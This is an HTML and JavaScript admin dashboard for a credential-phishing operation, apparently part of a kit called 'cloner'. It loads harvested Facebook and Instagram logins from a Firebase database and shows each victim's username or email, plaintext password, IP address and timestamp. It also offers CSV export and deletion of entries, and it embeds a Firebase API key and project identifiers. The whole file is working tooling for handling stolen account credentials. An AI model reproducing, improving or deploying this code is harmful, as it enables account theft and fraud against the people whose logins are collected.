<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/boxicons@2.0.7/css/boxicons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="wrapper">
        <!-- Sidebar -->
        <nav id="sidebar" class="bg-dark text-white">
            <div class="sidebar-header p-3">
                <h3>Admin Panel</h3>
            </div>

            <ul class="list-unstyled components p-3">
                <li class="active">
                    <a href="#" onclick="showDashboard()">
                        <i class="bx bxs-dashboard"></i> Dashboard
                    </a>
                </li>
                <li>
                    <a href="#" onclick="showFacebookLogins()">
                        <i class="bx bxl-facebook"></i> Facebook Logins
                    </a>
                </li>
                <li>
                    <a href="#" onclick="showInstagramLogins()">
                        <i class="bx bxl-instagram"></i> Instagram Logins
                    </a>
                </li>
                <li>
                    <a href="#" onclick="showAnalytics()">
                        <i class="bx bx-line-chart"></i> Analytics
                    </a>
                </li>
                <li>
                    <a href="#" onclick="showSettings()">
                        <i class="bx bx-cog"></i> Settings
                    </a>
                </li>
                <li>
                    <a href="#" onclick="logout()">
                        <i class="bx bx-log-out"></i> Logout
                    </a>
                </li>
            </ul>
        </nav>

        <!-- Page Content -->
        <div id="content" class="bg-light">
            <!-- Topbar -->
            <nav class="navbar navbar-expand-lg navbar-light bg-white shadow-sm">
                <div class="container-fluid">
                    <button type="button" id="sidebarCollapse" class="btn btn-dark">
                        <i class="bx bx-menu"></i>
                    </button>
                    <div>
                        <span class="navbar-text" id="currentDateTime"></span>
                    </div>
                </div>
            </nav>

            <!-- Main Content -->
            <div class="container-fluid p-4">
                <div id="dashboardContent">
                    <!-- Stats Cards -->
                    <div class="row mb-4">
                        <div class="col-md-3">
                            <div class="card bg-primary text-white">
                                <div class="card-body">
                                    <h5>Total Entries</h5>
                                    <h2 id="totalEntries">0</h2>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-success text-white">
                                <div class="card-body">
                                    <h5>Facebook Logins</h5>
                                    <h2 id="facebookCount">0</h2>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-info text-white">
                                <div class="card-body">
                                    <h5>Instagram Logins</h5>
                                    <h2 id="instagramCount">0</h2>
                                </div>
                            </div>
                        </div>
                        <div class="col-md-3">
                            <div class="card bg-warning text-white">
                                <div class="card-body">
                                    <h5>Today's Entries</h5>
                                    <h2 id="todayEntries">0</h2>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Data Table -->
                    <div class="card">
                        <div class="card-header">
                            <div class="d-flex justify-content-between align-items-center">
                                <h5 class="mb-0">Recent Entries</h5>
                                <div>
                                    <button class="btn btn-sm btn-success" onclick="exportToCSV()">
                                        <i class="bx bx-download"></i> Export CSV
                                    </button>
                                    <button class="btn btn-sm btn-danger" onclick="clearSelected()">
                                        <i class="bx bx-trash"></i> Delete Selected
                                    </button>
                                </div>
                            </div>
                        </div>
                        <div class="card-body">
                            <div class="table-responsive">
                                <table class="table table-hover">
                                    <thead>
                                        <tr>
                                            <th><input type="checkbox" id="selectAll"></th>
                                            <th>Platform</th>
                                            <th>Email/Username</th>
                                            <th>Password</th>
                                            <th>IP Address</th>
                                            <th>Timestamp</th>
                                            <th>Actions</th>
                                        </tr>
                                    </thead>
                                    <tbody id="loginTable">
                                        <!-- Data will be populated here -->
                                    </tbody>
                                </table>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.0/firebase-auth-compat.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script>
        // Initialize Firebase with your config
        const firebaseConfig = {
            apiKey: "AIzaSyBesPBLjIcXVu2NMiG_DYEmfgklEfo68bI",
            authDomain: "cloner-fc5a1.firebaseapp.com",
            databaseURL: "https://cloner-fc5a1-default-rtdb.firebaseio.com",
            projectId: "cloner-fc5a1",
            storageBucket: "cloner-fc5a1.firebasestorage.app",
            messagingSenderId: "423421065834",
            appId: "1:423421065834:web:f4b4efd83f1ac2221e2813",
            measurementId: "G-487W12PSKF"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const database = firebase.database();

        // Check authentication
        auth.onAuthStateChanged((user) => {
            if (!user) {
                window.location.href = 'index.html';
            }
        });

        // Update date time
        function updateDateTime() {
            const now = new Date();
            document.getElementById('currentDateTime').textContent = now.toLocaleString();
        }
        setInterval(updateDateTime, 1000);
        updateDateTime();

        // Load data
        async function loadData() {
            const fbLogins = database.ref('facebook_logins');
            const igLogins = database.ref('instagram_logins');
            
            try {
                const [fbSnapshot, igSnapshot] = await Promise.all([
                    fbLogins.once('value'),
                    igLogins.once('value')
                ]);

                const fbData = fbSnapshot.val() || {};
                const igData = igSnapshot.val() || {};

                updateStats(fbData, igData);
                updateTable(fbData, igData);
            } catch (error) {
                console.error('Error loading data:', error);
                alert('Error loading data. Please try again.');
            }
        }

        function updateStats(fbData, igData) {
            const fbCount = Object.keys(fbData).length;
            const igCount = Object.keys(igData).length;
            const total = fbCount + igCount;

            document.getElementById('totalEntries').textContent = total;
            document.getElementById('facebookCount').textContent = fbCount;
            document.getElementById('instagramCount').textContent = igCount;

            // Calculate today's entries
            const today = new Date().setHours(0, 0, 0, 0);
            const todayCount = [...Object.values(fbData), ...Object.values(igData)]
                .filter(entry => new Date(entry.timestamp).setHours(0, 0, 0, 0) === today)
                .length;
            document.getElementById('todayEntries').textContent = todayCount;
        }

        function updateTable(fbData, igData) {
            const tableBody = document.getElementById('loginTable');
            tableBody.innerHTML = '';

            const allData = [
                ...Object.entries(fbData).map(([key, value]) => ({ ...value, id: key, platform: 'Facebook' })),
                ...Object.entries(igData).map(([key, value]) => ({ ...value, id: key, platform: 'Instagram' }))
            ].sort((a, b) => b.timestamp - a.timestamp);

            allData.forEach(entry => {
                const row = document.createElement('tr');
                row.innerHTML = `
                    <td><input type="checkbox" class="entry-select" data-id="${entry.id}" data-platform="${entry.platform}"></td>
                    <td><i class="bx bxl-${entry.platform.toLowerCase()}"></i> ${entry.platform}</td>
                    <td>${entry.email || entry.username}</td>
                    <td>${entry.password}</td>
                    <td>${entry.ip}</td>
                    <td>${new Date(entry.timestamp).toLocaleString()}</td>
                    <td>
                        <button class="btn btn-sm btn-danger" onclick="deleteEntry('${entry.id}', '${entry.platform}')">
                            <i class="bx bx-trash"></i>
                        </button>
                    </td>
                `;
                tableBody.appendChild(row);
            });
        }

        // Delete entry
        async function deleteEntry(id, platform) {
            if (!confirm('Are you sure you want to delete this entry?')) return;

            const ref = database.ref(`${platform.toLowerCase()}_logins/${id}`);
            try {
                await ref.remove();
                loadData();
            } catch (error) {
                console.error('Error deleting entry:', error);
                alert('Error deleting entry. Please try again.');
            }
        }

        // Export to CSV
        function exportToCSV() {
            const table = document.querySelector('table');
            const rows = Array.from(table.querySelectorAll('tr'));
            
            const csv = rows.map(row => {
                return Array.from(row.querySelectorAll('th,td'))
                    .slice(1, -1) // Exclude checkbox and actions columns
                    .map(cell => `"${cell.textContent.trim()}"`)
                    .join(',');
            }).join('\n');

            const blob = new Blob([csv], { type: 'text/csv' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `login_data_${new Date().toISOString()}.csv`;
            a.click();
        }

        // Logout
        function logout() {
            auth.signOut().then(() => {
                window.location.href = 'index.html';
            }).catch((error) => {
                console.error('Error signing out:', error);
            });
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            loadData();
            
            // Select all functionality
            document.getElementById('selectAll').addEventListener('change', function() {
                document.querySelectorAll('.entry-select').forEach(checkbox => {
                    checkbox.checked = this.checked;
                });
            });
        });
    </script>

    <style>
        .wrapper {
            display: flex;
            min-height: 100vh;
        }

        #sidebar {
            min-width: 250px;
            max-width: 250px;
            min-height: 100vh;
            transition: all 0.3s;
        }

        #content {
            flex-grow: 1;
            overflow-x: hidden;
        }

        .sidebar-header {
            padding: 20px;
        }

        .components {
            padding: 20px 0;
        }

        .components li a {
            padding: 10px 20px;
            display: block;
            color: white;
            text-decoration: none;
        }

        .components li a:hover {
            background: #444;
        }

        .card {
            margin-bottom: 20px;
        }

        .bx {
            vertical-align: middle;
        }
    </style>
</body>
</html>
